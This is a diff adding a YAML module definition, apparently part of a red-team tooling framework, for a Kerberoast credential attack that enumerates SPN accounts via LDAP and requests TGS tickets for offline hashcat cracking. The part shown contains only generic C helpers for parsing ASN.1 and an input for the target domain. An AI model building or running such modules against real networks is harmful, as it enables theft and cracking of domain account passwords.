@@ -1,0 +1,39 @@
+name: Kerberoast
+description: Enumerates accounts with SPNs via LDAP and requests TGS tickets via SSPI for offline password cracking (T1558.003). Outputs hashcat $krb5tgs$ format. Standard user in a domain context.
+preimports:
+- |
+  #define SECURITY_WIN32
+  #include <windows.h>
+  #include <security.h>
+  #include <stdio.h>
+  static int asn1_rlen(unsigned char **pp, unsigned char *end) {
+      unsigned char *p = *pp;
+      if (p >= end) return -1;
+      if (*p < 0x80) { *pp = p + 1; return *p; }
+      if (*p == 0x81) { if (p + 1 >= end) return -1; *pp = p + 2; return p[1]; }
+      if (*p == 0x82) { if (p + 2 >= end) return -1; *pp = p + 3; return (p[1] << 8) | p[2]; }
+      if (*p == 0x83) { if (p + 3 >= end) return -1; *pp = p + 4; return (p[1] << 16) | (p[2] << 8) | p[3]; }
+      return -1;
+  }
+  static unsigned char *asn1_find(unsigned char *p, unsigned char *end, unsigned char tag, int *olen) {
+      while (p < end) {
+          unsigned char t = *p++;
+          int len = asn1_rlen(&p, end);
+          if (len < 0 || p + len > end) return NULL;
+          if (t == tag) { *olen = len; return p; }
+          p += len;
+      }
+      return NULL;
+  }
+  static int asn1_int(unsigned char *p, unsigned char *end) {
+      int olen;
+      unsigned char *v = asn1_find(p, end, 0x02, &olen);
+      if (!v || olen < 1) return -1;
+      int val = 0;
+      for (int i = 0; i < olen; i++) val = (val << 8) | v[i];
+      return val;
+  }
+imports:
+- winldap.h
+inputs:
+  domain: "Target domain FQDN (e.g. corp.local)"
